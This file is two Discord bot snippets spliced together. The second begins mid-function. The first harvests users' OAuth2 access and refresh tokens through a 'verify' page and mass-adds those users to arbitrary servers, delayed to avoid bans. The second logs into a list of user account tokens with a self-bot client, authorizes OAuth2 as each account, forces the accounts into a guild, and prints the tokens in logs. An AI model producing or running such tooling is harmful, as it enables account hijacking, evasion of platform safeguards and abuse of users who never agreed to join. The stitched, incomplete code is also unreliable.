const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const app = express();

const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
});

// User Schema (Bando ka data save karne ke liye)
const UserSchema = new mongoose.Schema({
    userId: String,
    accessToken: String,
    refreshToken: String
});
const User = mongoose.model('User', UserSchema);

// OAuth2 Callback Route
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send("No code found!");

    try {
        const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: process.env.REDIRECT_URI
        }));

        const userData = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${response.data.access_token}` }
        });

        // Database mein save ya update karna
        await User.findOneAndUpdate(
            { userId: userData.data.id },
            { accessToken: response.data.access_token, refreshToken: response.data.refresh_token },
            { upsert: true }
        );

        res.send("<h1>Verify Ho Gye Ho!</h1><p>Ab aap server mein add ho jayenge.</p>");
    } catch (err) {
        res.send("Error: " + err.message);
    }
});

// Join Command: !join [ServerID]
client.on('messageCreate', async (msg) => {
    if (msg.content.startsWith('!join')) {
        const serverId = msg.content.split(' ')[1];
        if (!serverId) return msg.reply("Bhai, Server ID toh do!");

        const allUsers = await User.find();
        msg.reply(`${allUsers.length} users ko join karwana shuru kar raha hoon...`);

        allUsers.forEach((user, index) => {
            setTimeout(async () => {
                try {
                    await axios.put(
                        `https://discord.com/api/guilds/${serverId}/members/${user.userId}`,
                        { access_token: user.accessToken },
                        { headers: { Authorization: `Bot ${process.env.TOKEN}` } }
                    );
                } catch (e) { console.log(`Failed for ${user.userId}`); }
            }, index * 2500); // 2.5 second ka delay taake ban na ho
        });
    }
});

mongoose.connect(process.env.MONGO_URI).then(() => {
    client.login(process.env.TOKEN);
    app.listen(process.env.PORT || 3000);
});
    if (i.commandName == "jointokens") {
        const guildId = i.options.getString("guildid") as string;
        const guild = client.guilds.cache.get(guildId);

        if (!guild) {
            return await i.reply({ embeds: [new EmbedBuilder().setColor("Red").setDescription(`> Invalid Guild Id`)] })
        }
        let done = 0;
        const tokens = utils.getTokens() || [];

        await i.reply({ embeds: [new EmbedBuilder().setColor("Green").setDescription(`> Starting (**${done}**/**${tokens.length}**)`)] })
        for (const token of tokens) {

            const tokenClient = new discordSelfBot.Client({});

            tokenClient.on("ready", async () => {
                console.log(`[tokens] Logged in as ${tokenClient.user?.tag}! [${token}]`);

                try {
                    const oAuth2URL = utils.getOAuth2URL()
                    if (!oAuth2URL) console.log("oAuth2URL null");

                    if (oAuth2URL) {
                        const authorize = await tokenClient.authorizeURL(oAuth2URL);
                        if (authorize.location) {
                            const code = authorize.location.split("code=")[1];
                            if (!code) console.log("code null");

                            if (code) {
                                const accessToken = await utils.getAccessToken(code);
                                if (!accessToken) console.log("accessToken null");

                                if (accessToken) {
                                    const user = tokenClient.user?.id as string
                                    const member = guild.members.cache.get(user);
                                    if (member) {
                                        console.log(`[Info] [tokens] ${tokenClient.user?.username} is Already in ${guild.name} [${token}]`);
                                    } else {
                                        await guild.members.add(user, { accessToken: accessToken })
                                        console.log(`[Done] [tokens] ${tokenClient.user?.username} joined ${guild.name} [${token}]`);
                                        done++;
                                        await i.editReply({ embeds: [new EmbedBuilder().setColor("Green").setDescription(`> Starting (**${done}**/**${tokens.length}**)`)] })
                                    }
                                }
                            }

                        }

                    }
                    tokenClient.destroy();
                } catch (err: any) {
                    console.log(`[Error] [tokens] ${tokenClient.user?.username} Failed join ${guild.name} [${token}] with error ${err}`);
                    console.log(token);
                    tokenClient.destroy();
                }
            });

            tokenClient.on("error", (error) => {
                console.error(`[tokens] Error with token ${tokenClient.user?.tag}:${error} [${token}]`);
            });
            await tokenClient.login(token).catch(() => console.log(`invalid token ${token}`));
        }
    }
});

const tokens = utils.getTokens() || [];


console.log(tokens);
